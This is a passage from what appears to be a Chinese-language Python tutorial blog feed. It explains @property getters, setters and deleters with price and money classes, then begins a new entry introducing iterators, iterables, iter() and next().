这个分页的功能包括：</p><ul><li>根据用户请求的当前页和总数据条数计算出 m 和 n</li><li>根据m 和 n 去数据库中请求数据</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Pager</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, current_page</span>):</span><br><span class="line">        <span class="comment"># 用户当前请求的页码（第一页、第二页...）</span></span><br><span class="line">        self.current_page = current_page</span><br><span class="line">        <span class="comment"># 每页默认显示10条数据</span></span><br><span class="line">        self.per_items = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">self</span>):</span><br><span class="line">        val = (self.current_page - <span class="number">1</span>) * self.per_items</span><br><span class="line">        <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">end</span>(<span class="params">self</span>):</span><br><span class="line">        val = self.current_page * self.per_items</span><br><span class="line">        <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ############### 调用 ###############</span></span><br><span class="line">p = Pager(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(p.start)  <span class="comment"># 就是起始值，即：m</span></span><br><span class="line"><span class="built_in">print</span>(p.end)  <span class="comment"># 就是结束值，即：n</span></span><br></pre></td></tr></table></figure><h2 id="property属性的两种方式"><a href="#property属性的两种方式" class="headerlink" title="property属性的两种方式"></a>property属性的两种方式</h2><blockquote><ul><li>装饰器 即：在方法上应用装饰器</li><li>类属性 即：在类中定义值为property对象的类属性</li></ul></blockquote><h3 id="装饰器方式"><a href="#装饰器方式" class="headerlink" title="装饰器方式"></a>装饰器方式</h3><p>在类的实例方法上应用@property装饰器</p><p>Python中的类有<code>经典类</code>和<code>新式类</code>，<code>新式类</code>的属性比<code>经典类</code>的属性丰富。（ 如果类继object，那么该类是新式类 ）</p><h4 id="经典类，具有一种-property装饰器："><a href="#经典类，具有一种-property装饰器：" class="headerlink" title="经典类，具有一种@property装饰器："></a>经典类，具有一种@property装饰器：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Goods</span>:</span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">price</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">100</span></span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">obj = Goods()</span><br><span class="line">result = obj.price  <span class="comment"># 自动执行 @property 修饰的 price 方法，并获取方法的返回值</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h4 id="新式类，具有三种-property装饰器"><a href="#新式类，具有三种-property装饰器" class="headerlink" title="新式类，具有三种@property装饰器"></a>新式类，具有三种@property装饰器</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Goods</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.price = <span class="number">100</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#获取价格</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_price</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.price</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置价格</span></span><br><span class="line"><span class="meta">    @_price.setter</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_price</span>(<span class="params">self, value</span>):</span><br><span class="line">        self.price = value</span><br><span class="line">        <span class="keyword">return</span> self.price</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># #删除价格</span></span><br><span class="line"><span class="meta">    @_price.deleter</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">del_price</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">del</span> self.price</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">goods = Goods()</span><br><span class="line"><span class="built_in">print</span>(goods._price) <span class="comment"># 自动执行 @property 修饰的 del_price 方法，并获取方法的返回值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改</span></span><br><span class="line">result = goods.set_price = <span class="number">200</span>      <span class="comment"># 自动执行 @price.setter 修饰的 del_price 方法，并将200 赋值给方法的参数</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除</span></span><br><span class="line"><span class="keyword">del</span> goods.del_price         <span class="comment"># 自动执行 @price.deleter 修饰的del_price 方法</span></span><br><span class="line"><span class="built_in">print</span>(goods.price)</span><br><span class="line">goods = Goods()</span><br><span class="line"><span class="built_in">print</span>(goods.price)</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li>经典类中的属性只有一种访问方式，其对应被 @property 修饰的方法</li><li>新式类中的属性有三种访问方式，并分别对应了三个被@property、@方法名.setter、@方法名.deleter修饰的方法</li></ul><p>由于新式类中具有三种访问方式，我们可以根据它们几个属性的访问特点，分别将三个方法定义为对同一个属性：获取、修改、删除</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Goods</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 原价</span></span><br><span class="line">        self.original_price = <span class="number">100</span></span><br><span class="line">        <span class="comment"># 折扣</span></span><br><span class="line">        self.discount = <span class="number">0.8</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">price</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 实际价格 = 原价 * 折扣</span></span><br><span class="line">        new_price = self.original_price * self.discount</span><br><span class="line">        <span class="keyword">return</span> new_price</span><br><span class="line"></span><br><span class="line"><span class="meta">    @price.setter</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">price</span>(<span class="params">self, value</span>):</span><br><span class="line">        self.original_price = value</span><br><span class="line"></span><br><span class="line"><span class="meta">    @price.deleter</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">price</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">del</span> self.original_price</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">obj = Goods()</span><br><span class="line"><span class="built_in">print</span>(obj.price)  <span class="comment"># 获取商品价格</span></span><br><span class="line">obj.price = <span class="number">200</span>  <span class="comment"># 修改商品原价</span></span><br><span class="line"><span class="built_in">print</span>(obj.price)</span><br><span class="line"><span class="keyword">del</span> obj.price  <span class="comment"># 删除商品原价</span></span><br><span class="line"><span class="comment"># 当前属性被删除之后再获取则报错</span></span><br><span class="line"><span class="comment"># print(obj.price)</span></span><br></pre></td></tr></table></figure><h3 id="类属性方式，创建值为property对象的类属性"><a href="#类属性方式，创建值为property对象的类属性" class="headerlink" title="类属性方式，创建值为property对象的类属性"></a>类属性方式，创建值为property对象的类属性</h3><blockquote><p>python2.7里面用的多，python3少见</p></blockquote><ul><li>当使用类属性的方式创建property属性时，<code>经典类</code>和<code>新式类</code>无区别</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Goods</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_price</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">100</span></span><br><span class="line"></span><br><span class="line">    price = <span class="built_in">property</span>(get_price)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">obj = Goods()</span><br><span class="line">result = obj.price  <span class="comment"># 自动调用get_price方法，并获取方法的返回值</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>property方法中有个四个参数</p><ul><li><p>第一个参数是方法名，调用 对象.属性 时自动触发执行方法</p></li><li><p>第二个参数是方法名，调用 对象.属性 ＝ XXX 时自动触发执行方法</p></li><li><p>第三个参数是方法名，调用 del 对象.属性 时自动触发执行方法</p></li><li><p>第四个参数是字符串，调用 类.属性.__doc__ ，此参数是该属性的描述信息</p><blockquote><p>当前获取property说明不能用实例属性，必要要是类属性</p></blockquote></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_bar</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;getter...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;a...&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_bar</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;必须两个参数&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;setter:&quot;</span>, value)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;set value&#x27;</span> + value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">del_bar</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;deleter...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;b...&#x27;</span></span><br><span class="line"></span><br><span class="line">    BAR = <span class="built_in">property</span>(get_bar, set_bar, del_bar, <span class="string">&quot;description...&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">obj = Foo()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(obj.BAR)  <span class="comment"># 自动调用第一个参数中定义的方法：get_bar</span></span><br><span class="line">obj.BAR = <span class="string">&quot;c&quot;</span>  <span class="comment"># 自动调用第二个参数中定义的方法：set_bar方法，并将“c”当作参数传入</span></span><br><span class="line">desc = Foo.BAR.__doc__  <span class="comment"># 自动获取第四个参数中设置的值：description...</span></span><br><span class="line"><span class="built_in">print</span>(desc)</span><br><span class="line"><span class="keyword">del</span> obj.BAR  <span class="comment"># 自动调用第三个参数中定义的方法：del_bar方法</span></span><br></pre></td></tr></table></figure><p>由于<code>类属性方式</code>创建property属性具有3种访问方式，我们可以根据它们几个属性的访问特点，分别将三个方法定义为对同一个属性：获取、修改、删除</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Goods</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 原价</span></span><br><span class="line">        self.original_price = <span class="number">100</span></span><br><span class="line">        <span class="comment"># 折扣</span></span><br><span class="line">        self.discount = <span class="number">0.8</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_price</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 实际价格 = 原价 * 折扣</span></span><br><span class="line">        new_price = self.original_price * self.discount</span><br><span class="line">        <span class="keyword">return</span> new_price</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_price</span>(<span class="params">self, value</span>):</span><br><span class="line">        self.original_price = value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">del_price</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">del</span> self.original_price</span><br><span class="line"></span><br><span class="line">    PRICE = <span class="built_in">property</span>(get_price, set_price, del_price, <span class="string">&#x27;价格属性描述...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">obj = Goods()</span><br><span class="line"><span class="built_in">print</span>(obj.PRICE)  <span class="comment"># 获取商品价格</span></span><br><span class="line">obj.PRICE = <span class="number">200</span>  <span class="comment"># 修改商品原价</span></span><br><span class="line"><span class="built_in">print</span>(obj.PRICE)</span><br><span class="line"><span class="keyword">del</span> obj.PRICE  <span class="comment"># 删除商品原价</span></span><br></pre></td></tr></table></figure><h2 id="property-应用"><a href="#property-应用" class="headerlink" title="@property - 应用"></a><code>@property</code> - 应用</h2><h3 id="私有属性添加getter和setter方法"><a href="#私有属性添加getter和setter方法" class="headerlink" title="私有属性添加getter和setter方法"></a>私有属性添加getter和setter方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Money</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.__money = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_money</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.__money</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_money</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(value, <span class="built_in">int</span>):</span><br><span class="line">            self.__money = value</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;error:不是整型数字&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">money = Money()</span><br><span class="line"><span class="built_in">print</span>(money.get_money())</span><br><span class="line">money.set_money(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(money.get_money())</span><br></pre></td></tr></table></figure><h3 id="使用property升级getter和setter方法"><a href="#使用property升级getter和setter方法" class="headerlink" title="使用property升级getter和setter方法"></a>使用property升级getter和setter方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Money</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.__money = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_money</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.__money</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_money</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(value, <span class="built_in">int</span>):</span><br><span class="line">            self.__money = value</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;error:不是整型数字&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义一个属性，当对这个money设置值时调用setMoney,当获取值时调用getMoney</span></span><br><span class="line">    money = <span class="built_in">property</span>(get_money, set_money)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">money_obj = Money()</span><br><span class="line">money_obj.money = <span class="number">100</span>  <span class="comment"># 调用setMoney方法</span></span><br><span class="line"><span class="built_in">print</span>(money_obj.money)  <span class="comment"># 调用getMoney方法</span></span><br></pre></td></tr></table></figure><h3 id="使用-property取代getter和setter方法"><a href="#使用-property取代getter和setter方法" class="headerlink" title="使用@property取代getter和setter方法"></a>使用<code>@property</code>取代getter和setter方法</h3><ul><li>重新实现一个属性的设置和读取方法,可做边界判定</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Money</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.__money = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用装饰器对money进行装饰，那么会自动添加一个叫money的属性，当调用获取money的值时，调用装饰的方法</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">money</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.__money</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用装饰器对money进行装饰，当对money设置值时，调用装饰的方法</span></span><br><span class="line"><span class="meta">    @money.setter</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">money</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(value, <span class="built_in">int</span>):</span><br><span class="line">            self.__money = value</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;error:不是整型数字&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">money_obj = Money()</span><br><span class="line">money_obj.money = <span class="number">100</span></span><br><span class="line"><span class="built_in">print</span>(money_obj.money)</span><br></pre></td></tr></table></figure><hr><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li><a href="https://blog.csdn.net/qq_26442553/article/details/81775449">Python多继承与super使用详解_涤生大数据的博客-CSDN博客_python多继承</a></li><li><a href="https://blog.csdn.net/weixin_41841097/article/details/109068491">python关于多继承super传参的问题_weixin_41841097的博客-CSDN博客</a></li><li><a href="https://www.pythontab.com/html/2018/pythonjichu_1106/1374.html">Python 中__new__方法详解及使用 - Python基础教程|Python教程|Python入门 - PythonTab中文网</a></li><li><a href="https://zhuanlan.zhihu.com/p/35943253">Python面试之理解__new__和__init__的区别 - 知乎 (zhihu.com)</a></li><li>[<a href="https://www.cnblogs.com/ifantastic/p/3175735.html">Python] Python 之 <strong>new</strong>() 方法与实例化 - iFantasticMe - 博客园 (cnblogs.com)</a></li><li><a href="https://zhuanlan.zhihu.com/p/58205586">python常用内建属性大全 - 知乎 (zhihu.com)</a></li></ul></blockquote><blockquote><p><strong>声明：</strong></p><ol><li><p>若文章存在错误，望诸君不吝指正^</p></li><li><p>部分笔记由于年代久远，做的笔记找不到最初是引用谁的，若是不允许引用转载，请联系我</p></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> Python全栈 </category>
          
          <category> Python核心编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>9. 三器一闭</title>
      <link href="/Python%E5%85%A8%E6%A0%88/Python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/9.%20%E4%B8%89%E5%99%A8%E4%B8%80%E9%97%AD.html"/>
      <url>/Python%E5%85%A8%E6%A0%88/Python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/9.%20%E4%B8%89%E5%99%A8%E4%B8%80%E9%97%AD.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="三器一闭"><a href="#三器一闭" class="headerlink" title="三器一闭"></a>三器一闭</h2><p>迭代器、生成器、装饰器以及闭包</p><h3 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h3><h5 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h5><p>如果开发中有以下需求，如何解决？</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">StuSystem</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    学生管理系统</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.stus = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        添加一个新的学生</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        name = <span class="built_in">input</span>(<span class="string">&quot;请输入新学生的姓名:&quot;</span>)</span><br><span class="line">        tel = <span class="built_in">input</span>(<span class="string">&quot;请输入新学生的手机号:&quot;</span>)</span><br><span class="line">        address = <span class="built_in">input</span>(<span class="string">&quot;请输入新学生的住址:&quot;</span>)</span><br><span class="line"></span><br><span class="line">        new_stu = <span class="built_in">dict</span>()</span><br><span class="line">        new_stu[<span class="string">&quot;name&quot;</span>] = name</span><br><span class="line">        new_stu[<span class="string">&quot;tel&quot;</span>] = tel</span><br><span class="line">        new_stu[<span class="string">&quot;address&quot;</span>] = address</span><br><span class="line"></span><br><span class="line">        self.stus.append(new_stu)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建管理系统对象</span></span><br><span class="line">stu_sys = StuSystem()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加3个学生信息到系统中</span></span><br><span class="line">stu_sys.add()</span><br><span class="line">stu_sys.add()</span><br><span class="line">stu_sys.add()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 问题1：怎样才能实现用for循环遍历系统中所有的学生信息呢？下面的方式能实现吗？</span></span><br><span class="line"><span class="keyword">for</span> temp <span class="keyword">in</span> stu_sys:</span><br><span class="line">    <span class="built_in">print</span>(temp)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 问题2：如果需要一个列表，这个列表 样子例如 [&#123;&#x27;name&#x27;: &#x27;张三&#x27;, &#x27;id&#x27;: 10086&#125;, &#123;&#x27;name&#x27;: &#x27;李四&#x27;: &#x27;id&#x27;: 10087&#125;]</span></span><br><span class="line"><span class="comment"># stu_list = [ ...列表推导式...]</span></span><br><span class="line"><span class="comment"># 这个列表推导式该怎样写才能实现呢？</span></span><br></pre></td></tr></table></figure><p>在实际开发工作中，经常需要快速的将对象转化问其他的不同的数据类型，此时如果能快速的遍历出自定义的对象，这样大大减少代码的冗余，而且可读性会更优美</p><p>问题是，怎样实现呢？</p><p>今天我们要学习的知识只有1个，那就是<code>迭代器</code></p><h5 id="什么是迭代"><a href="#什么是迭代" class="headerlink" title="什么是迭代"></a>什么是迭代</h5><p>迭代是访问序列类型元素的一种方式</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nums = [<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以通过for循环将nums列表中的每个数据依次获取</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="built_in">print</span>(num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;teacher&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> temp <span class="keyword">in</span> name:</span><br><span class="line">    <span class="built_in">print</span>(temp)</span><br></pre></td></tr></table></figure><p>我们已经知道可以对<code>list</code>、<code>tuple</code>、<code>str</code>等类型的数据使用<code>for...in...</code>的循环语法从其中依次拿到数据进行使用，我们把这样的过程称为遍历，也叫<code>迭代</code></p><h5 id="可迭代对象"><a href="#可迭代对象" class="headerlink" title="可迭代对象"></a>可迭代对象</h5><p>是否所有的数据类型都可以放到<code>for...in...</code>的语句中，然后让<code>for...in...</code>每次从中取出一条数据供我们使用呢？</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">weight = <span class="number">160</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> weight:</span><br><span class="line">    <span class="built_in">print</span>(item)  <span class="comment"># 报错</span></span><br></pre></td></tr></table></figure><p>通过运行可以发现，并不是所有的类型都可以通过<code>for...in...</code>的方式进行遍历</p><p>我们可以通俗的认为：只要是可以通过for…in…的形式进行遍历的，那么这个数据类型就是可以迭代的</p><p>例如，下面的是可以迭代的数据类型</p><ul><li>列表</li><li>元组</li><li>字典</li><li>字符串</li></ul><p>而下面的则不是可以迭代的数据类型</p><ul><li>整型</li><li>浮点型</li></ul><p>那是否可以通过某种方式能够测量出一个数据类型到底是否是可以迭代呢？</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">50</span>]: <span class="keyword">from</span> collections.abc <span class="keyword">import</span> Iterable</span><br><span class="line"></span><br><span class="line">In [<span class="number">51</span>]: <span class="built_in">isinstance</span>([], Iterable)</span><br><span class="line">Out[<span class="number">51</span>]: <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">52</span>]: <span class="built_in">isinstance</span>(&#123;&#125;, Iterable)</span><br><span class="line">Out[<span class="number">52</span>]: <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">53</span>]: <span class="built_in">isinstance</span>(<span class="string">&#x27;abc&#x27;</span>, Iterable)</span><br><span class="line">Out[<span class="number">53</span>]: <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">54</span>]: <span class="built_in">isinstance</span>(mylist, Iterable)</span><br><span class="line">Out[<span class="number">54</span>]: <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">55</span>]: <span class="built_in">isinstance</span>(<span class="number">100</span>, Iterable)</span><br><span class="line">Out[<span class="number">55</span>]: <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>只要是通过<code>isinstance</code>来判断出是<code>Iterable</code>类的实例，即<code>isinstance</code>的结果是<code>True</code>那么就表示，这个数据类型是可以迭代的数据类型</p><h5 id="迭代器-1"><a href="#迭代器-1" class="headerlink" title="迭代器"></a>迭代器</h5><p>迭代器是一个可以记住遍历的位置的对象。迭代器对象从第一个元素开始访问，直到所有的元素被访问完结束。迭代器只能往前不会后退。</p><blockquote><p>可迭代对象的本质</p></blockquote><p>分析 可迭代对象 进行迭代的过程，发现每迭代一次（即在<code>for...in...</code>中每循环一次）都会返回对象中的下一条数据，一直向后读取数据直到迭代了所有数据后结束。</p><p>那么，在这个过程中就应该有一个“人”去记录每次访问到了第几条数据，以便每次迭代都可以返回下一条数据。我们把这个能帮助我们进行数据迭代的“人”称为迭代器(Iterator)</p><p>可迭代对象的本质就是可以向我们提供一个这样的中间“人”，即迭代器帮助我们对其进行迭代遍历使用。</p><p><code>list</code>、<code>tuple</code>等都是可迭代对象，我们可以通过<code>iter()</code>函数获取这些可迭代对象的迭代器。然后我们可以对获取到的迭代器不断使用<code>next()</code>函数来获取下一条数据。</p><blockquote><p>获取可迭代对象的迭代器</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections.abc <span class="keyword">import</span> Iterator</span><br><span class="line"></span><br><span class="line">nums = [<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>, <span class="number">44</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(nums))</span><br><span class="line"></span><br><span class="line">nums_iter = <span class="built_in">iter</span>(nums)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(nums_iter))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;nums&quot;</span>, <span class="built_in">isinstance</span>(nums, Iterator))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;nums_iter&quot;</span>, <span class="built_in">isinstance</span>(nums_iter, Iterator))</span><br></pre></td></tr></table></figure><blockquote><p>获取迭代器的数据</p></blockquote><p>上面提到，通过<code>iter()</code>能够得到一个可迭代对象的 迭代器，可以通过<code>next()</code>函数多次提取迭代器中的数据，下面我们就测试下</p><p>测试代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections.abc <span class="keyword">import</span> Iterator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nums = [<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>, <span class="number">44</span>]</span><br><span class="line">nums_iter = <span class="built_in">iter</span>(nums)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;nums&quot;</span>, <span class="built_in">isinstance</span>(nums, Iterator))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;nums_iter&quot;</span>, <span class="built_in">isinstance</span>(nums_iter, Iterator))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num1 = <span class="built_in">next</span>(nums_iter)</span><br><span class="line"><span class="built_in">print</span>(num1)</span><br><span class="line"></span><br><span class="line">num2 = <span class="built_in">next</span>(nums_iter)</span><br><span class="line"><span class="built_in">print</span>(num2)</span><br><span class="line"></span><br><span class="line">num3 = <span class="built_in">next</span>(nums_iter)</span><br><span class="line"><span class="built_in">print</span>(num3)</span><br><span class="line"></span><br><span class="line">num4 = <span class="built_in">next</span>(nums_iter)</span><br><span class="line"><span class="built_in">print</span>(num4)</span><br></pre></td></tr></table></figure><blockquote><p>StopIteration 异常</p></blockquote><p>如果将上面的代码，多写一次的<code>next()</code>会怎样呢？看如下测试代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections.abc <span class="keyword">import</span> Iterator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nums = [<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>, <span class="number">44</span>]</span><br><span class="line">nums_iter = <span class="built_in">iter</span>(nums)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;nums&quot;</span>, <span class="built_in">isinstance</span>(nums, Iterator))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;nums_iter&quot;</span>, <span class="built_in">isinstance</span>(nums_iter, Iterator))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num1 = <span class="built_in">next</span>(nums_iter)</span><br><span class="line"><span class="built_in">print</span>(num1)</span><br><span class="line"></span><br><span class="line">num2 = <span 